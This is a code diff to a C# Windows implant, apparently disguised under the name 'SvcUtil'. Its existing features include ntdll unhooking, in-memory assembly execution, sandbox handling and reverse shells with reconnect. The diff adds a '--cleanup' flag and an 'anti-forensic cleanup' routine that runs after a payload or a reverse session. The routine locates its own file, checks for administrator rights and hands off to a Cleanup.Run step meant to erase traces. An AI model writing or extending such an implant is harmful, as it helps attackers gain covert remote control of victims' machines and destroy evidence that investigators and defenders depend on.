@@ -32,6 +32,7 @@ namespace SvcUtil
         private static bool _unhookNtdll;
         private static bool _execAsm;
         private static string[] _asmArgs;
+        private static bool _cleanup;
 
         static void Main(string[] args)
         {
@@ -58,6 +59,7 @@ namespace SvcUtil
             _unhookNtdll = false;
             _execAsm = false;
             _asmArgs = new string[0];
+            _cleanup = false;
 
             if (!ParseArgs(args))
                 return;
@@ -158,6 +160,11 @@ namespace SvcUtil
                 {
                     Array.Clear(payload, 0, payload.Length);
                 }
+
+                // Post-payload anti-forensic cleanup
+                if (_cleanup)
+                    DoCleanup();
+
                 return;
             }
 
@@ -169,6 +176,10 @@ namespace SvcUtil
                 RunReverseWithReconnect();
             else
                 RunReverse();
+
+            // Post-session anti-forensic cleanup
+            if (_cleanup)
+                DoCleanup();
         }
 
         // ── Argument parsing ─────────────────────────────────────────
@@ -308,6 +319,10 @@ namespace SvcUtil
                         _noSandbox = true;
                         break;
 
+                    case "--cleanup":
+                        _cleanup = true;
+                        break;
+
                     default:
                         if (i == 0 && !args[0].StartsWith("-"))
                         {
@@ -324,6 +339,38 @@ namespace SvcUtil
                 }
             }
             return true;
+        }
+
+        // ── Anti-forensic cleanup ────────────────────────────────────
+
+        private static void DoCleanup()
+        {
+            try
+            {
+                // Resolve selfPath — null when running in-memory
+                string selfPath = null;
+                try
+                {
+                    var entry = System.Reflection.Assembly.GetEntryAssembly();
+                    if (entry != null && !string.IsNullOrEmpty(entry.Location))
+                        selfPath = entry.Location;
+                }
+                catch { }
+
+                // Check elevation
+                bool isElevated = false;
+                try
+                {
+                    var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
+                    isElevated = principal.IsInRole(
+                        System.Security.Principal.WindowsBuiltInRole.Administrator);
+                }
+                catch { }
+
+                Cleanup.Run(selfPath, isElevated);
+            }
+            catch { }
         }
 
         // ── Execution modes ──────────────────────────────────────────
